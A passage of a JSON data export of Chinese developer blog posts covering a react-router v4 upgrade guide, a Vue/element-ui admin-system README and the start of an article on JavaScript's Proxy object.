跟 react 一样拆成了两部分，核心的 react-router 和依运行环境而定的 react-router-dom 或 react-router-native（跟 react-dom 和 react-native 一样）。本文要说的是浏览器环境，也就是 react-router + react-router-dom\u003c/p\u003e\n\u003cp\u003e先安装依赖（推荐使用 yarn）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eyarn add react-router react-router-dom \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为什么要安装 history 后面会解释。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e组件外导航与 react-router-redux\u003c/h2\u003e\n\u003cp\u003e之前我们项目中使用了 \u003ca target=\"_blank\" href=\"https://github.com/reactjs/react-router-redux\"\u003ereact-router-redux\u003c/a\u003e 你有\u003ca target=\"_blank\" href=\"https://reacttraining.com/react-router/core/guides/redux-integration/deep-integration\"\u003e很多理由\u003c/a\u003e使用它，但对于我们来说唯一的理由或者用处就是用于在页面组件之外导航，react-router-redux 让你可以在任何地方通过 dispatch 处理页面跳转，如：store.dispatch(push('/'))。因为这个我们就必须使用 react-router-redux 吗？当然不需要，有更简单的办法实现这个需求。所以这次升级我移除了react-router-redux， 写作此文时支持 react-router v4 的 react-router-redux 还处于 v5.0.0-alpha.7 也是原因之一。\u003c/p\u003e\n\u003cp\u003e还记得之前安装的 \u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/history\"\u003ehistory\u003c/a\u003e 吗？history 是 react-router 唯二的主要依赖之一，之所以要显式安装，是因为我们要使用它来实现页面组件外导航。以下以 browser history 为例（hash history 和 memory history 都是一样的）：\u003c/p\u003e\n\u003cp\u003e我们不使用 react-router-dom 提供的 BrowserRouter 而是自己实现一个\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// history.js\nimport createHistory from \u003cspan class=\"hljs-string\"\u003e'history/createBrowserHistory'\u003c/span\u003e;\n\nconst \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e = createHistory();\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// index.js\nimport React from \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\nimport ReactDOM from \u003cspan class=\"hljs-string\"\u003e'react-dom'\u003c/span\u003e;\nimport { Router } from \u003cspan class=\"hljs-string\"\u003e'react-router'\u003c/span\u003e;\nimport \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e from \u003cspan class=\"hljs-string\"\u003e'./history'\u003c/span\u003e;\nimport App from \u003cspan class=\"hljs-string\"\u003e'./app'\u003c/span\u003e;\n\nReactDOM.render(\n  \u0026lt;Router \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e={\u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e}\u0026gt;\n    \u0026lt;App /\u0026gt;\n  \u0026lt;/Router\u0026gt;,\n  document.getElementById(\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e)\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e搞定！就这么简单，这样在任何地方只要引用 history 就可以使用它进行导航操作，如 history.push('/')，更多使用方式请参考 history \u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/history\"\u003e文档\u003c/a\u003e。其实 react-router-dom 的 BrowserRouter 跟我们做了同样的事，区别在于我们这么做能把 history 暴露出来。这个 history 就是页面组件 props 里面的 history 自然也就能做同样的事情。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e静态配置\u003c/h2\u003e\n\u003cp\u003ereact-router v3 是面向配置的，组件写法只是一种语法糖。而 react-router v4 是完全面向组件的，提供的 Route Switch 等都是真正的组件。这也就导致只能按组件的方式写路由，不能写配置。但是 v3 那样的配置确实有一些方便之处，如统一管理、使用方便等。\u003c/p\u003e\n\u003cp\u003e多亏 JSX 灵活的语法，我们依然有办法按配置的方式写 react-router v4 的路由。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// routes.js\nimport Home form \u003cspan class=\"hljs-string\"\u003e'./home'\u003c/span\u003e;\nimport About form \u003cspan class=\"hljs-string\"\u003e'./about'\u003c/span\u003e;\nimport Help form \u003cspan class=\"hljs-string\"\u003e'./help'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default [{\n  path: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e,\n  exact: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n  component: Home\n}, {\n  path: \u003cspan class=\"hljs-string\"\u003e'/about'\u003c/span\u003e,\n  component: About\n}, {\n  path: \u003cspan class=\"hljs-string\"\u003e'/help'\u003c/span\u003e,\n  component: Help\n}];\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// app.js\nimport React from \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\nimport { Switch, Route } from \u003cspan class=\"hljs-string\"\u003e'react-router'\u003c/span\u003e;\nimport routes from \u003cspan class=\"hljs-string\"\u003e'./routes'\u003c/span\u003e;\nimport NotFound from \u003cspan class=\"hljs-string\"\u003e'./not-found'\u003c/span\u003e;\n\nclass App extends React.Component {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n      \u0026lt;Switch\u0026gt;\n        {routes.map((route, i) =\u0026gt; \u0026lt;Route key={i} exact={!!route.exact} path={route.path} component={route.component} /\u0026gt;)}\n        \u0026lt;Route component={NotFound} /\u0026gt;\n      \u0026lt;/Switch\u0026gt;\n    );\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default App;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样我们就用配置的方式写出了面向组件的路由，兼顾两者的优点。如果有嵌套路由需求，可以参考\u003ca target=\"_blank\" href=\"https://reacttraining.com/react-router/web/example/static-router\"\u003e官方示例\u003c/a\u003e。官方也提供了一个 \u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/react-router/blob/master/packages/react-router-config\"\u003ereact-router-config\u003c/a\u003e， 不过我没有使用，一来觉得没必要，二来写作此文时它还处于 v1.0.0-beta.4 版本。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e异步组件与 Code Splitting\u003c/h2\u003e\n\u003cp\u003eWeb 应用最大的一个优势就是不必下载整个应用，只用下载需要的部分就可以使用。要达到这样的目标，就需要对代码进行分片，异步加载组件。可惜 react-router v4 没有像 v3 一样提供加载异步组件的接口。这部分工作就需要我们自己来处理。\u003c/p\u003e\n\u003cp\u003e我们可以创建一个高阶组件 Bundle，专门用来加载异步组件。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// bundle.js\nimport React from \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\n\nclass Bundle extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { Component: null };\n    props.load().then(Component =\u0026gt; this.setState({ Component: Component.default }));\n  }\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n    const { load, ...props } = this.props;\n    const Component = this.state.Component;\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Component ? \u0026lt;Component {...props} /\u0026gt; : null;\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default Bundle;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后修改一下 routes.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// routes.js\nimport React from \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\nimport Bundle from \u003cspan class=\"hljs-string\"\u003e'./bundle'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default [{\n  path: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e,\n  exact: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n  component(props) {\n    // 这里的 component 函数也是一个高阶组件\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;Bundle {...props} load={() =\u0026gt; import(\u003cspan class=\"hljs-string\"\u003e'./home'\u003c/span\u003e)} /\u0026gt;;\n  }\n}, {\n  path: \u003cspan class=\"hljs-string\"\u003e'/about'\u003c/span\u003e,\n  component(props) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;Bundle {...props} load={() =\u0026gt; import(\u003cspan class=\"hljs-string\"\u003e'./about'\u003c/span\u003e)} /\u0026gt;;\n  }\n}, {\n  path: \u003cspan class=\"hljs-string\"\u003e'/help'\u003c/span\u003e,\n  component(props) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u0026lt;Bundle {...props} load={() =\u0026gt; import(\u003cspan class=\"hljs-string\"\u003e'./help'\u003c/span\u003e)} /\u0026gt;;\n  }\n}];\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样每个页面都会打包成单独的 JS，访问相应页面才会去异步加载对应的组件。这样也可以做精细化缓存控制。\n需要注意的是 import() 语法在写作本文时还处于 Stage 2 的状态，需给 Babel 添加 \u003ca target=\"_blank\" href=\"https://babeljs.io/docs/plugins/syntax-dynamic-import/\"\u003esyntax-dynamic-import\u003c/a\u003e 插件才能正常工作，另外需 webpack 2 及以上才支持。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e查询参数\u003c/h2\u003e\n\u003cp\u003e因为\u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/react-router/issues/4410\"\u003e各种原因\u003c/a\u003e react-router v4 不再解析 ?key=value 这样的 URL 的查询参数，页面组件 props.location 中只有 search 字符串。这跟 v3 不兼容，而且很不方便。我们有办法兼容一下吗？当然有，这时候之前写的 histroy.js 又有新的用处了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// history.js\nimport qs from \u003cspan class=\"hljs-string\"\u003e'qs'\u003c/span\u003e;\nimport createHistory from \u003cspan class=\"hljs-string\"\u003e'history/createBrowserHistory'\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e addQuery(\u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e) {\n  const location = history.location;\n  history.location = { ...location, query: qs.parse(location.search, { ignoreQueryPrefix: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e }) };\n}\n\nconst \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e = createHistory();\n\naddQuery(\u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e);\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e const unlisten = history.listen(() =\u0026gt; {\n  // 每次页面跳转都会执行\n  addQuery(\u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e);\n});\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样我们就能在页面组件 props.location.query 拿到解析好的 URL 查询参数了，跟 v3 完美兼容。还有个额外的好处是在任何地方引用 history 都可以拿到解析好的 URL 查询参数。需要注意的是，在 \u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/history\"\u003ehistory\u003c/a\u003e 的设计中，history 对象是 Mutable 的，所以我们可以直接修改 history。但是 history.location 是 Immutable 的，所以我们要确保每一个 location 对象都是全新的。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e搭配 Redux\u003c/h2\u003e\n\u003cp\u003ereact-router v4 跟 redux 搭配有一个大坑（mobx 应该也有同样的问题），详情请看\u003ca target=\"_blank\" href=\"https://github.com/ReactTraining/react-router/blob/master/packages/react-router/docs/guides/blocked-updates.md\"\u003e这篇文章\u003c/a\u003e，这里就不再赘述。简单来说，如果一个组件用 redux 的 connect 包装过，又️不是 Route 的子组件，那么 history 的变更就不会触发这个组件的更新，它的子组件自然也不会更新。比如应用的根组件（上文的 App）。\u003c/p\u003e\n\u003cp\u003e解决方案也很简单，可以用 react-router v4 提供的 withRouter 再包装一遍：withRouter(connect(...)(App))，或者让 App 做为 Router 的子组件，原理都一样。我采用的后者。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// app.js\nimport React from \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\nimport { connect } from \u003cspan class=\"hljs-string\"\u003e'react-redux'\u003c/span\u003e;\nimport { Switch, Route } from \u003cspan class=\"hljs-string\"\u003e'react-router'\u003c/span\u003e;\nimport routes from \u003cspan class=\"hljs-string\"\u003e'./routes'\u003c/span\u003e;\nimport NotFound from \u003cspan class=\"hljs-string\"\u003e'./not-found'\u003c/span\u003e;\n\nclass App extends React.Component {\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n      \u0026lt;Switch\u0026gt;\n        {routes.map((route, i) =\u0026gt; \u0026lt;Route key={i} exact={!!route.exact} path={route.path} component={route.component} /\u0026gt;)}\n        \u0026lt;Route component={NotFound} /\u0026gt;\n      \u0026lt;/Switch\u0026gt;\n    );\n  }\n}\n\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e mapStateToProps(state) {\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e {\n    someState: state.someState\n  };\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default connect(mapStateToProps)(App);\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// index.js\nimport React from \u003cspan class=\"hljs-string\"\u003e'react'\u003c/span\u003e;\nimport ReactDOM from \u003cspan class=\"hljs-string\"\u003e'react-dom'\u003c/span\u003e;\nimport { Provider } from \u003cspan class=\"hljs-string\"\u003e'react-redux'\u003c/span\u003e;\nimport { Router, Route } from \u003cspan class=\"hljs-string\"\u003e'react-router'\u003c/span\u003e;\nimport store from \u003cspan class=\"hljs-string\"\u003e'./store'\u003c/span\u003e;\nimport \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e from \u003cspan class=\"hljs-string\"\u003e'./history'\u003c/span\u003e;\nimport App from \u003cspan class=\"hljs-string\"\u003e'./app'\u003c/span\u003e;\n\nReactDOM.render(\n  \u0026lt;Provider store={store}\u0026gt;\n    \u0026lt;Router \u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e={\u003cspan class=\"hljs-built_in\"\u003ehistory\u003c/span\u003e}\u0026gt;\n      \u0026lt;Route component={App} /\u0026gt; {/* 没有 path 就会匹配所有路由 */}\n    \u0026lt;/Router\u0026gt;\n  \u0026lt;/Provider\u0026gt;,\n  document.getElementById(\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e)\n);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e最后\u003c/h2\u003e\n\u003cp\u003e不得不说升级 react-router 很困难，坑也很多。但是把坑一个个填完，最终完美升级也是一件很有意思，很有成就感的事。希望这篇文章能对你有所帮助。\u003c/p\u003e\n\u003cp\u003e另外完整的 Demo 请戳我的 \u003ca target=\"_blank\" href=\"https://github.com/yangmingshan/react-demo\"\u003eGitHub\u003c/a\u003e，喜欢的话点个 Star 吧 :P\u003c/p\u003e\n","buildTime":"1514979058.1469","__v":0}
{"_id":{"$oid":"5a4e178e201569114874c003"},"id":"5a3f223351882506e50cda5c","author":{"$oid":"5a4e178e201569114874bff1"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/25/1608b39b9167c885?w=1366\u0026h=662\u0026f=jpeg\u0026s=105349","https://user-gold-cdn.xitu.io/2017/12/25/1608b39ff2f9ad05?w=1366\u0026h=662\u0026f=jpeg\u0026s=104277","https://user-gold-cdn.xitu.io/2017/12/25/1608b42f67bcff39?w=1366\u0026h=662\u0026f=gif\u0026s=4527110"],"screenShot":null}],"title":"基于vue2.0 +vuex+ element-ui后台管理系统 ","meta":{"likeCount":0},"tag":["Node.js","Vue.js","MongoDB","Webpack","Vuex","vue-router"],"comment":[],"shortContent":"A magical vue element touzi admin. 此项目是 vue2.0 + element-ui + node+mongodb 构建的后台管理系统，所有的数据都是从服务器实时获取的真实数据，具有真实的注册、登录、数据显示、新增数据、修改数据、删除数据等功能…","content":"\u003cp\u003e\u003cb\u003exxx金融后台管理系统\u003c/b\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eA magical vue element touzi admin.\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://118.126.117.130\"\u003e效果演示地址\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/wdlhao/vue2-element-touzi-admin\"\u003egithub地址\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608b39b9167c885?w=1366\u0026amp;h=662\u0026amp;f=jpeg\u0026amp;s=105349\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608b39ff2f9ad05?w=1366\u0026amp;h=662\u0026amp;f=jpeg\u0026amp;s=104277\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/25/1608b42f67bcff39?w=1366\u0026amp;h=662\u0026amp;f=gif\u0026amp;s=4527110\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eAbout\u003c/h2\u003e\n\u003cp\u003e此项目是 vue2.0 + element-ui + node+mongodb 构建的后台管理系统，所有的数据都是从服务器实时获取的真实数据，具有真实的注册、登录、数据显示、新增数据、修改数据、删除数据等功能。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e  如果对您对此项目有兴趣，可以点 \u003cspan class=\"hljs-string\"\u003e\"Star\"\u003c/span\u003e 支持一下 谢谢！ ^_^\n  \n  或者您可以 \u003cspan class=\"hljs-string\"\u003e\"follow\"\u003c/span\u003e 一下，我会不断开源更多的有趣的项目\n  \n  开发环境 windows 64 、nodejs 6.11.0\n  \n  如有问题请直接在 Issues 中提，或者您发现问题并有非常好的解决方案，欢迎 PR\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e技术栈\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e前端技术栈：\u003c/strong\u003e vue2 + vuex + vue-router + webpack2.0 + ES6/7 + less + element-ui\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e服务端技术栈：\u003c/strong\u003e nodejs + express  + mongodb\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前序准备\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e运行前准备：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e1、不需要在本地调试及开发：\n\u003ca target=\"_blank\" href=\"http://118.126.117.130\"\u003e请访问本项目的服务器地址。\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e2、需要在本地调试及开发：\u003c/p\u003e\n\u003cp\u003e由于此项目是基于nodejs和mongodb的前后端结合项目，你需要进行nodejs和mongodb的相关准备工作。项目运行之前，请确保系统已经安装以下应用：\u003c/p\u003e\n\u003cp\u003e(1)、node (6.0 及以上版本)。使用细节，请参考：\u003ca target=\"_blank\" href=\"https://nodejs.org/en/download/\"\u003enode的下载及安装。\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e(2)、mongodb 。使用细节，请参考：\u003ca target=\"_blank\" href=\"https://pan.baidu.com/s/1jIxPJrK\"\u003emongodb的下载及使用。\u003c/a\u003e【下载，db/log配置，开启服务，use touzi，导入数据】\u003c/p\u003e\n\u003cp\u003e(3)、robomongod。使用细节，请参考：\u003ca target=\"_blank\" href=\"https://pan.baidu.com/s/1hsQuc08\"\u003erobomongod的下载及使用。\u003c/a\u003e（注意：mongodb可视化视图工具，本项目不是必须安装，主要用于方便查看数据库数据）。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e开发：\u003c/h2\u003e\n\u003cp\u003egit clone https://github.com/wdlhao/vue2-element-touzi-admin\u003c/p\u003e\n\u003cp\u003ecd vue2-element-touzi-admin\u003c/p\u003e\n\u003cp\u003enpm install\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003enpm run dev\u003c/strong\u003e (访问本地后台系统，需开启服务端express服务)。运行之后，会默认打开本地访问路径：http://localhost:8012\u003c/p\u003e\n\u003cp\u003e开启服务端express服务方法如下：双击server/start.bat启动文件，执行命令\u0026gt;node index.js即可，启动后切记不要关闭cmd窗口。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e发布\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003enpm run bulid\u003c/strong\u003e (生成打包之后的项目文件,此文件主要用于项目部署)。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e功能\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e登录/退出 -- 完成\u003c/li\u003e\n\u003cli\u003e首页 -- 完成\u003c/li\u003e\n\u003cli\u003e用户列表 -- 完成\u003c/li\u003e\n\u003cli\u003e信息列表 -- 完成\u003c/li\u003e\n\u003cli\u003e信息管理\n\u003cul\u003e\n\u003cli\u003e个人信息 -- 完成\u003c/li\u003e\n\u003cli\u003e修改信息 -- 完成\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e资金管理\n\u003cul\u003e\n\u003cli\u003e资金流水 -- 完成\u003c/li\u003e\n\u003cli\u003e支付单据 -- 完成\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e投资管理\n\u003cul\u003e\n\u003cli\u003e省份投资 -- 完成\u003c/li\u003e\n\u003cli\u003e区域投资 -- 完成\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e金融文章\n\u003cul\u003e\n\u003cli\u003e文章发布 -- 完成\u003c/li\u003e\n\u003cli\u003e文章编辑 -- 完成\u003c/li\u003e\n\u003cli\u003e查看文章 -- 完成\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e资金数据\n\u003cul\u003e\n\u003cli\u003e投资分布 -- 完成\u003c/li\u003e\n\u003cli\u003e项目分布 -- 完成\u003c/li\u003e\n\u003cli\u003e收支统计 -- 完成\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e目录结构\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003e├── build                      // 构建相关  \n├── config                     // 配置相关\n├── exampleImgs                // 项目示例图片\n├── outdb                      // 导入数据库的初始化数据\n├── server                     // node服务端\n│   ├── api.js                    // 封装的接口请求\n│   ├── db.js                     // db数据模型定义\n│   ├── index.js                  // express服务器\n│   ├── mutils.js                 // 服务端工具类\n├── src                        // 源代码\n│   ├── assets                 // 图片等静态资源\n│   ├── components             // 全局公用组件\n│   ├── config                 // 接口请求配置\n│   ├── fonts                  // fontawesome字体库文件\n│   ├── layout                 // 全局 组件\n│   ├── page                   // 项目所有的视图\n│   ├── register               // 第三方库注册\n│   ├── router                 // 登录路由\n│   ├── store                  // 项目vuex数据存储器\n│   ├── style                  // 全局样式\n│   ├── utils                  // 全局公用方法\n│   ├── vendor                 // 公用vendor\n│   ├── App.vue                // 入口页面\n│   ├── main.js                // 入口 加载组件 初始化\n├── static                     // 第三方不打包资源\n│   └── Tinymce                // 富文本\n├── .babelrc                   // babel-loader 配置\n├── .gitignore                 // git 忽略项\n├── eslintrc.js                // eslint 配置项\n├── favicon.ico                // favicon图标\n├── index.html                 // html模板\n├── package.json               // 包依赖配置\n└── README.md                  // 说明文件\n\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e\u003ca target=\"_blank\" href=\"http://118.126.117.130\"\u003e查看更多demo\u003c/a\u003e\u003c/h2\u003e\n\u003ch2 class=\"heading\"\u003eLicense\u003c/h2\u003e\n\u003cp\u003eMIT\u003c/p\u003e\n","buildTime":"1515066813.866","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac403371"},"id":"5a3cb0846fb9a044fb07f36c","author":{"$oid":"5a4cc38785472a29ac403345"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"使用 Javascript 原生的 Proxy 优化应用","meta":{"likeCount":0},"tag":["JavaScript","CSS","Promise","前端"],"comment":[],"shortContent":"看到 Proxy就应该想到代理模式(Proxy Pattern)，Proxy 是 Javascript ES2015 标准的一部分，我们应该学会使用它，代理模式是一种设计模式，使用 Proxy 对象可以轻而易举的在 Javascript 中创建代理模式。然而，使用设计模式并不是…","content":"\u003cp\u003e看到 \u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy\"\u003eProxy\u003c/a\u003e就应该想到\u003ca target=\"_blank\" href=\"https://en.wikipedia.org/wiki/Proxy_pattern\"\u003e代理模式(Proxy Pattern)\u003c/a\u003e，\u003ccode\u003eProxy\u003c/code\u003e 是 Javascript ES2015 标准的一部分，我们应该学会使用它，代理模式是一种设计模式，使用 \u003ccode\u003eProxy\u003c/code\u003e 对象可以轻而易举的在 Javascript 中创建代理模式。然而，使用设计模式并不是目的，目的在于解决实际问题。本文首先会简单介绍 \u003ccode\u003eProxy\u003c/code\u003e 的基本用法，接着将会叙述如何使用 \u003ccode\u003eProxy\u003c/code\u003e 创建代理模式并且对我们的应用进行优化。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003eProxy 的基本使用\u003c/h2\u003e\n\u003cp\u003e开始学习 \u003ccode\u003eProxy\u003c/code\u003e 的使用之前，建议首先对 \u003ca target=\"_blank\" href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect\"\u003eReflect\u003c/a\u003e 有一定的了解，如果很陌生的话，建议先花 1 分钟浏览相关知识。\u003c/p\u003e\n\u003cp\u003e好了，现在假设已经具备了一定的 \u003ccode\u003eReflect\u003c/code\u003e 知识，就开始掌握 \u003ccode\u003eProxy\u003c/code\u003e 吧。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e基本语法\u003c/h3\u003e\n\u003cp\u003e和 \u003ccode\u003eProxy\u003c/code\u003e 相关的方法一共就两个：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e构造方法 本文着重讨论\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eProxy.revocable()\u003c/code\u003e 创建一个可撤销的 \u003ccode\u003eProxy\u003c/code\u003e 对象，其余与构造函数类似，理解了 \u003ccode\u003eProxy\u003c/code\u003e 的构造方法后，该方法与构造方法使用非常类似，本文不再涉及\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e接下来本文将围绕 \u003ccode\u003eProxy\u003c/code\u003e 的构造方法进行讲解。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e p = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eProxy\u003c/span\u003e(target, handler);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cem\u003e参数\u003c/em\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003etarget\n任何类型的对象，包括原生数组，函数，甚至另一个 \u003ccode\u003eProxy\u003c/code\u003e 对象\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ehandler\n一个对象，其属性是当执行一个操作时定义代理的行为的函数， 允许的属性一共 13 种，与 \u003ccode\u003eReflect\u003c/code\u003e 的方法名一致\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003e返回\u003c/em\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ep\n\u003ccode\u003eProxy\u003c/code\u003e 对象\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意： \u003ccode\u003enew Proxy\u003c/code\u003e 是稳定操作，不会对 \u003ccode\u003etarget\u003c/code\u003e 有任何影响。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e下面来看几个代表性的例子，便于加深理解。\u003c/p\u003e\n\u003cp\u003e代理一个对象字面量：\u003c/p\u003e\n\u003cpre\u003e\u003ccode 